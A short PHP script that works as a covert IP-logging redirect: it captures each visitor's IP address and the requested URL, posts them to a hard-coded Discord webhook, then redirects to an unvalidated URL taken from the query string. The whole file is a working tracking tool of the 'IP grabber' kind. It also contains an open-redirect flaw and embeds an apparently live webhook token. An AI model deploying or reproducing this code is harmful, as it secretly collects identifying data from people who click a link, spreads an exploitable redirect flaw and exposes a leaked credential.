<?php
// Replace with your Discord webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1262650823247396945/QOMdT691BaQSp40oSpT-UrJOqvVIePV2uLafQhP8gLX6IUyJg1lz0t9VlV6PJh--SDiv';

// Log IP address and other details
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
$url = $_GET['url'];

$log_message = "IP: $ip accessed URL: $url";

// Prepare JSON payload
$data = json_encode([
    'content' => $log_message
]);

// Use curl to send POST request to Discord webhook
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $webhookUrl);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Redirect to the specified URL
header("Location: $url");
exit;
?>
